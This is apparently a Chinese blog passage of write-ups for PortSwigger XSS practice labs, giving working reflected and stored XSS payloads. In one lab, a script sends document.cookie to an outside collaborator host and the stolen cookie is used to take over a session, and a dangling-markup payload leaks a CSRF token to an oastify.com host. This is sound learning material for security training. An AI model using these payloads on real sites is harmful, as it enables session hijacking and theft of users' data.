<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128142949.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128142949.png"></a></p>
<p>使用 HTML 编码。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128142914.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128142914.png"></a></p>
<p><code>&lt;h1&gt;</code> 中的回显仍然是字符串，但 <code>&lt;input&gt;</code> 的 <code>value</code> 属性对输入的 payload 进行了解析。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128142933.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128142933.png"></a></p>
<p>构造 payload 2: <code>&quot;&gt;&lt;xss autofocus tabindex=1 onfocus=alert(1)&gt;&lt;/xss&gt;</code></p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128143455.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128143455.png"></a></p>
<p>编码绕过，payload 3: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x22;&amp;#x3e;&amp;#x3c;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x20;&amp;#x61;&amp;#x75;&amp;#x74;&amp;#x6f;&amp;#x66;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x73;&amp;#x20;&amp;#x74;&amp;#x61;&amp;#x62;&amp;#x69;&amp;#x6e;&amp;#x64;&amp;#x65;&amp;#x78;&amp;#x3d;&amp;#x31;&amp;#x20;&amp;#x6f;&amp;#x6e;&amp;#x66;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x73;&amp;#x3d;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x3e;&amp;#x3c;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x3e;</span><br></pre></td></tr></table></figure>

<p>但双引号没过去。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128143908.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128143908.png"></a></p>
<p>换一种思路，闭合属性，修改属性，paylaod 4: <code>&quot; autofocus tabindex=1 onfocus=alert(1) &quot;</code></p>
<p>成功。</p>
<p>回到上面的 payload 2 <code>&quot;&gt;&lt;xss autofocus tabindex=1 onfocus=alert(1)&gt;&lt;/xss&gt;</code> 在注入后发现，回显页面好像歪打正着，把一些关键属性 <code>autofocus</code>, <code>onfocus</code> 等都加进去了，由此想到：魔改一下这条 payload，没准就能执行了，后面 <code>&amp;quot</code> 可能是因为双引号没有闭合好。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128145344.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128145344.png"></a></p>
<p>修改后的 payload 5：<code>&quot;&gt;&lt;xss autofocus tabindex=1 onfocus=alert(1) &quot;</code></p>
<p>也成功注入，弹窗以后就不截了，没意思 ( ͠°◞  °)</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128145812.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128145812.png"></a></p>
<h1 id="13-Lab-Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded"><a href="#13-Lab-Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded" class="headerlink" title="13 Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded"></a>13 Lab: Stored XSS into anchor <code>href</code> attribute with double quotes HTML-encoded</h1><p>题目中说这是一个存储型 XSS，我们直接看评论部分。</p>
<p>发布一条评论，之后看源码，有回显的位置就可能有 XSS，一共有三个，我在图中标记出来了，题目提示是 <code>href</code>，我们就先测这个。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128165506.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128165506.png"></a></p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128170104.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128170104.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128170754.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128170754.png"></a></p>
<p>payload <code>caishao.com&amp;#x22; onmouseover=alert(/xss/)</code></p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128170719.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128170719.png"></a></p>
<p>因为过滤掉了双引号，需要闭合双引号的注入方式都不太行，这时可以考虑使用 javascript 伪协议，本质上也算是链接。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128171237.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128171237.png"></a></p>
<p>根据题目，使用 javascript 伪协议注入成功，Name 和 Comment 部分没成功。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128171333.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128171333.png"></a></p>
<blockquote>
<p>[!question] 问题<br>双引号还能使用哪些方式绕过？</p>
</blockquote>
<h1 id="14-Lab-Reflected-XSS-in-canonical-link-tag"><a href="#14-Lab-Reflected-XSS-in-canonical-link-tag" class="headerlink" title="14 Lab: Reflected XSS in canonical link tag"></a>14 Lab: Reflected XSS in canonical link tag</h1><p>原理：<a target="_blank" rel="noopener" href="https://portswigger.net/research/xss-in-hidden-input-fields">XSS in hidden input fields</a></p>
<p>payload（文章里好像叫 vector:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;canonical&quot; accesskey=&quot;X&quot; onclick=&quot;alert(1)&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p>直接修改 html 源码，按 “ALT+SHIFT+X” 能触发 <code>alert(1)</code></p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128174205.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128174205.png"></a></p>
<p>现在问题就是如何修改 <code>&lt;link&gt;</code> 元素 –&gt; 在 url 上做文章？</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128175834.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128175834.png"></a></p>
<p>或者抓包，重放，在 burp 中修改。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128180142.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128180142.png"></a></p>
<p>之前我说过，挖洞就是寻找矛盾点或歧义，客户端和服务端对同一对象的不同解读方式，就可能产生漏洞。</p>
<p>如果要在 url 上做文章的话，例如 <code>/post?postId=4%22%20accesskey=%22X%22%20onclick=%22alert(1)</code>，本题的矛盾点就是服务端解读 <code>postId=4</code>，之后回显到客户端 <code>&lt;link&gt;</code> 标签的内容是 <code>[host]/post?postId=4%22%20accesskey=%22X%22%20onclick=%22alert(1)</code> 且<code>accesskey</code>, <code>onclick</code> 被解析为 html 属性。</p>
<p>&#x3D;&#x3D;&gt; sql 注入？</p>
<p>简单用 sqlmap 扫了一下，貌似并没有 sql 注入点。</p>
<p>我真是个大憨憨！为啥非得揪住一个需要传参数的页面呢，直接用主页不香嘛？ <code>web-security-academy.net/</code> 只要能把 url 回显到 <code>&lt;link&gt;</code> 标签就行。</p>
<p>payload: <code>web-security-academy.net/?%27accesskey=%27X%27onclick=%27alert(1)</code></p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128235513.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128235513.png"></a></p>
<p>按下 “ALT+SHIFT+X” 能触发弹窗。</p>
<blockquote>
<p>[!question] 问题<br> 不过有一说一，为啥双引号不行？<code>web-security-academy.net/?%22%20accesskey=%22X%22onclick=%22alert(1)</code> </p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128235859.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128235859.png"></a></p>
<h1 id="15-Lab-Reflected-XSS-into-a-JavaScript-string-with-single-quote-and-backslash-escaped"><a href="#15-Lab-Reflected-XSS-into-a-JavaScript-string-with-single-quote-and-backslash-escaped" class="headerlink" title="15 Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped"></a>15 Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped</h1><p>在搜索框中搜索一串有辨识度的字符串 <code>CAISHAO</code>，使用 Ctrl+shift+f 搜索，观察其回显位置。一共有两处：一个是在 <code>&lt;h1&gt;</code> 标签中，一个是在 <code>script</code> 中，根据题目，我们直接测试 js 中的注入点。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240129210600.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240129210600.png"></a></p>
<p>用一个今天新看的 vector: <code>CAISHAO&#39;&lt;/script&gt;&lt;img src=javascript:alert(1) onerror=location=src&gt;</code>.</p>
<p>成功。</p>
<p>再来看这个 js 代码，输入中的 <code>&lt;/script&gt;</code> 成功截断了 js 代码块，且输入中的 <code>&lt;img&gt;</code> 标签被当成了 html 元素执行。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240129211318.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240129211318.png"></a></p>
<h1 id="16-Lab-Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded"><a href="#16-Lab-Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded" class="headerlink" title="16 Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded"></a>16 Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded</h1><p>输入易辨识字符串，观察回显位置。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240130155652.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240130155652.png"></a></p>
<p>使用 Lab 15 的 vector，发现尖括号被过滤了。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240130155911.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240130155911.png"></a></p>
<p>换一种思路，没必要非得闭合 <code>&lt;script&gt;</code> 标签，只要我们的输入能被当作 js 代码执行就可以，为什么不直接拼接一个 <code>alert(/xss/)</code> 呢？（这里要注意注入后 js 语法的正确性。</p>
<p>构造 payload：<code>&#39;;alert(/xss/);&#39;</code>，成功。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240130160303.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240130160303.png"></a></p>
<p>solution 里面使用的 payload：<code>&#39;-alert(1)-&#39;</code></p>
<h1 id="17-Lab-Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-escaped"><a href="#17-Lab-Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-escaped" class="headerlink" title="17 Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped"></a>17 Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped</h1><p>注入：<code>&#39;&lt;/script&gt;&lt;img src=javascript:alert(1) onerror=location=src&gt;&#39;</code>，发现双引号和尖括号被 HTML 编码，单引号被转义。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240130162404.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240130162404.png"></a></p>
<p>通过观察回显发现转义的方法存在缺陷，仅在单引号前加了个 <code>\</code>。</p>
<p>构造 payload  <code>\&#39;;alert(/xss/)//</code>，注入成功。</p>
<h1 id="18-Lab-Stored-XSS-into-onclick-event-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-and-backslash-escaped"><a href="#18-Lab-Stored-XSS-into-onclick-event-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-and-backslash-escaped" class="headerlink" title="18 Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped"></a>18 Lab: Stored XSS into <code>onclick</code> event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped</h1><p>只有评论部分存在注入点，大概率就是存储型 xss（题干），随便发一条评论，观察回显位置。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240130173442.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240130173442.png"></a></p>
<p><code>&lt;a&gt;</code> 标签的 <code>onclick</code> 属性定义并调用一个空函数 <code>tracker()</code>，不管怎么传参都没法在 <code>tracker()</code> 上做文章。</p>
<p>利用 <code>href</code> 属性 payload: <code>http://caishao.com&quot; onmouseover=&#39;alert(/xss/)&#39;</code>，无效。根据题干也能看出来，双引号和尖括号被 HTML 编码，单引号和反斜杠被转义。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240130211830.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240130211830.png"></a></p>
<blockquote>
<p>[!question] 问题<br>双引号被 HTML 编码，还有能使用双引号的有效 payload 吗？感觉一旦使用 HTML 编码，绕过方式好像都在回避使用这个字符，如：伪协议绕过。</p>
</blockquote>
<p>单引号只是被转义，我们使用编码绕过。构造 payload <code>&#39;);alert(1);(&#39;</code>，将 <code>onclick</code> 属性中的 <code>tracker.track(&#39;</code> 闭合，再插入 <code>alert()</code> 函数。之后使用 <a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/">CyberChef</a> 编码，选择 “To HTML Entity”。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240130213154.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240130213154.png"></a></p>
<p>拼接完成的代码如下，点击链接，弹窗。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240130213454.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240130213454.png"></a></p>
<h1 id="19-Lab-Reflected-XSS-in-a-JavaScript-URL-with-some-characters-blocked"><a href="#19-Lab-Reflected-XSS-in-a-JavaScript-URL-with-some-characters-blocked" class="headerlink" title="19 Lab: Reflected XSS in a JavaScript URL with some characters blocked"></a>19 Lab: Reflected XSS in a JavaScript URL with some characters blocked</h1><p>题目上说是反射型 XSS，但我没找到注入点呀，只有评论区能输入，评论区的大概率是存储型的吧。 </p>
<p>迄今位置，遇到的反射型 XSS 注入点一般都在<strong>搜索框</strong>那块，能把输入回显在页面上（或 HTML 代码中），还遇到一个在有 <code>canonical</code> 属性的 <code>&lt;link&gt;</code> 标签里面。本题的注入点我还有点没找到emmm</p>
<p>简单阅读了一下源码，还真让我找到注入点了。点击 “Back to Blog” 后，跳转链接有一个 javascript 伪协议，其中会回显 url 的部分内容。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240130225536.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240130225536.png"></a></p>
<h1 id="20-Lab-Reflected-XSS-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-Unicode-escaped"><a href="#20-Lab-Reflected-XSS-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-Unicode-escaped" class="headerlink" title="20 Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped"></a>20 Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped</h1><p>输入特殊字符串，观察其回显位置。发现在一个<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals">模板字面量</a>中，我们可以通过使用占位符 <code>$&#123;expression&#125;</code> 嵌入待替换的表达式，从而执行 js 代码。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131202249.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131202249.png"></a></p>
<p>构造 payload: <code>CAISHAO&#39; $&#123;alert(/xss/)&#125;</code>，虽然单引号使用了 unicode 编码，但嵌入表达式中的代码在创建字符串之前被成功执行。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131203125.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131203125.png"></a></p>
<h1 id="21-Lab-Reflected-XSS-with-some-SVG-markup-allowed"><a href="#21-Lab-Reflected-XSS-with-some-SVG-markup-allowed" class="headerlink" title="21 Lab: Reflected XSS with some SVG markup allowed"></a>21 Lab: Reflected XSS with some SVG markup allowed</h1><p>简单爆破一下，观察有哪些标签可以使用。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131204154.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131204154.png"></a></p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131205048.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131205048.png"></a></p>
<p>这里我用的是 PortSwigger XSS cheat sheet 里面的 tag 字典，可能不是太准确，在知道了 <code>&lt;svg&gt;</code> 可用之后，可以做一个字典爆破一下允许的 <code>&lt;svg&gt;</code> 标签，这里我直接选用 <code>&lt;image&gt;</code> 标签。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131205001.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131205001.png"></a></p>
<p>输入 <code>&lt;image&gt;</code> 虽然网页没有呈现什么，但其实已经回显在代码中了。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131205350.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131205350.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131205341.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131205341.png"></a></p>
<p>构造 payload <code>&lt;image src=javascript://alert(/xss/) onerror=location=src /&gt;</code> 却提示 “Event is not allowed”。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131205915.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131205915.png"></a></p>
<p>没必要搁那瞎猜了，已经知道是使用 svg 元素了，就直接拿 cheat-sheet 里面现有的 payload 试一试。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131210111.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131210111.png"></a></p>
<p>提示标签不对就换标签，提示事件不对就换事件。最后发现的有效的 payload：<code>&lt;svg&gt;&lt;animatetransform onbegin=alert(1) attributeName=transform&gt;</code>，主打一个随心所欲。</p>
<p>ps: 简单爆了一下允许的事件，发现就一个 <code>onbegin</code>，也就是说标签只能选 svg 的那几个动画元素了。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131211313.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131211313.png"></a></p>
<p>与 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/SVG/Element#svg_%E5%85%83%E7%B4%A0%EF%BC%88%E6%8C%89%E7%B1%BB%E5%88%AB%E5%88%86%E7%B1%BB%EF%BC%89">svg 的动画元素</a> 有关的 payload 的都能在 cheat-sheet 中找到，我的思路没毛病。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131211454.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131211454.png"></a></p>
<h1 id="22-Lab-Exploiting-cross-site-scripting-to-steal-cookies"><a href="#22-Lab-Exploiting-cross-site-scripting-to-steal-cookies" class="headerlink" title="22 Lab: Exploiting cross-site scripting to steal cookies"></a>22 Lab: Exploiting cross-site scripting to steal cookies</h1><p>目标：评论部分存在存储型 XSS，利用该漏洞拿到受害人的 cookie，然后利用该 cookie 模拟受害人登录。</p>
<p>注入了半天，发现直接在评论区内容部分写 js 就完事了，<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131232206.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131232206.png"></a></p>
<p>只要能把 <code>document.cookie</code> 传到服务器就行，这里的服务器我用的 Burp Collaborator 生成的。</p>
<p>payload:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&quot;https://example.com/?cookie=&quot;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在 Collaborator 中可以查看获取到的 cookie。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240201102540.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240201102540.png"></a></p>
<blockquote>
<p>[!question] 问题<br>拿到 cookie 如何操作？</p>
<p><strong>答：</strong> 修改 cookie （Cookie-Editor or F12 Application），刷新页面即可。</p>
</blockquote>
<p>使用插件 Cookie-Editor，改不改没反应啊！</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131232916.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131232916.png"></a></p>
<p>F12 在 Application 里面改也没反应，这个 cookie 真的是受害人的嘛，按理说改一下 cookie 再刷新页面就进去了。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240201102959.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240201102959.png"></a></p>
<p>不浪费时间了，查看 solution，其中给的 payload 如下，使用了 <code>fetch()</code> 发送请求（前天才看了 <code>fetch()</code> 咋没想起来呢！！ </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;https://BURP-COLLABORATOR-SUBDOMAIN&#x27;</span>, &#123; </span></span><br><span class="line"><span class="language-javascript"><span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>, </span></span><br><span class="line"><span class="language-javascript"><span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>, </span></span><br><span class="line"><span class="language-javascript"><span class="attr">body</span>:<span class="variable language_">document</span>.<span class="property">cookie</span> </span></span><br><span class="line"><span class="language-javascript">&#125;); </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>观察 Collaborator，cookie 信息在请求消息体中。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240201104837.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240201104837.png"></a></p>
<p>原来只是我没找对请求呀，上面那个是我自己触发的，发送的是我自己的 cookie，下面这个才是受害人触发的（裂开，自己的 cookie 是啥都不知道！！）</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240201105054.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240201105054.png"></a></p>
<p>使用插件 Cookie-Editor 或 F12 Application 修改 cookie 并刷新页面，提示 lab 解决。</p>
<p>访问下 <code>/my-account</code> ，成功进入管理员页面。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240201105533.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240201105533.png"></a></p>
<h1 id="23-Lab-Reflected-XSS-protected-by-very-strict-CSP-with-dangling-markup-attack"><a href="#23-Lab-Reflected-XSS-protected-by-very-strict-CSP-with-dangling-markup-attack" class="headerlink" title="23 Lab: Reflected XSS protected by very strict CSP, with dangling markup attack"></a>23 Lab: <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/reflected">Reflected XSS</a> protected by very strict <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/content-security-policy">CSP</a>, with <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/dangling-markup">dangling markup</a> attack</h1><p>描述：使用严格 CSP，反射型 XSS<br>目标：绕过 CSP，拿到受害人 CSRF token，并修改受害人邮箱为 <code>hacker@evil-user.net</code>。为了更好的模拟受害人点击，攻击向量中必须包含 “Click”。</p>
<p>抓包，修改邮箱请求的 api 为 <code>/my-account/change-email</code> 使用 POST 方法传递两个参数，分别是 <code>email</code> 和 <code>csrf</code> token，且特殊字符自动 URL 编码。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240203201854.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240203201854.png"></a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;;object-src &#x27;none&#x27;; style-src &#x27;self&#x27;; script-src &#x27;self&#x27;; img-src &#x27;self&#x27;; base-uri &#x27;none&#x27;;</span><br></pre></td></tr></table></figure>

<p><code>default-src &#39;self&#39;</code> 表示默认&#x2F;未说明时，仅允许加载同源资源。<code>object-src &#39;none&#39;;base-uri &#39;none&#39;;</code> 表示无法加载对象资源，如 <code>&lt;embed&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;applet&gt;</code>，也无法使用 <code>&lt;base&gt;</code> 修改 base uri。剩下的内容表示只能从该网页相同的源中加载样式、js 脚本、图片。</p>
<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 以下尝试全是错的，可以不看 T_T &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<p>首先我们尝试 HTML 注入，看能不能注入一些可执行的 HTML 元素。</p>
<p>在前端注入，报错 “@” 前不能含特殊字符 “&lt;”, “&gt;”, “(“等。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240203203113.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240203203113.png"></a></p>
<p>使用 URL 编码后发送 <code>%3Cscript%3Ealert%281%29%3C%2Fscript%3E@qq.com</code>，发现输入内容中的 “%” 也被编码了，</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240203202735.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240203202735.png"></a></p>
<p>直接抓包修改 email，提示 302，点击 “Follo redirection” 响应成功跳转到用户主页。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240203203539.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240203203539.png"></a></p>
<p>邮箱回显出注入的 script 标签，但并未执行成功，不过也说明邮箱格式更多的是<strong>前端验证</strong>的。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240203203743.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240203203743.png"></a></p>
<p>但是 email 中仍需要包含 ‘@’ 符号。修改邮箱，不带 ‘@’ 符号，<code>email=&lt;script&gt;alert(3)&lt;/script&gt;&amp;csrf=0xjhIDpcJNHZsZiol5tEp4jjeB5wB34w</code>，发现邮箱未更改。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240203205015.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240203205015.png"></a></p>
<blockquote>
<p>[!question] 问题<br>这里未执行成功的原因是什么？</p>
<p><strong>答：</strong> 特殊符号 &gt;&lt;” 转换成了 HTML 实体。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240203204654.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240203204654.png"></a></p>
<p>构造 payload <code>&lt;img src=&#39;https://kc0uwm9v8xtvzi5jvv8vrfptikobc10q.oastify.com/?@qq.com</code></p>
<p>因为有空格，参数不好传，我就直接全都 url 编码了，工具仍是 <a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/">CyberChef</a>。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240203205308.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240203205308.png"></a></p>
<p>“&gt;&lt;” 被转换成 HTML 实体了呀，如何绕过呢？</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240203205827.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240203205827.png"></a></p>
<blockquote>
<p>[!question] 问题<br>如何绕过 HTML 实体编码？</p>
</blockquote>
<blockquote>
<p>[!question] 问题<br>这个注入点找的对吗，题目上说是 RXSS，通过修改邮箱注入，不就成存储型的了？<br>不过如果要使用 dangling-markup 攻击获取 csrf token 的话，好像也修改邮箱这里了，离得近。</p>
<p><strong>答：</strong> 找的并不对，看下面。</p>
</blockquote>
<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 以上尝试全是错的 T_T &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<p>原来是我注入点找错了，我还纳闷呢，哪有反射型 XSS 呢，原来搁这呢。url 中的参数会回显在 input 元素的 value 属性中。</p>
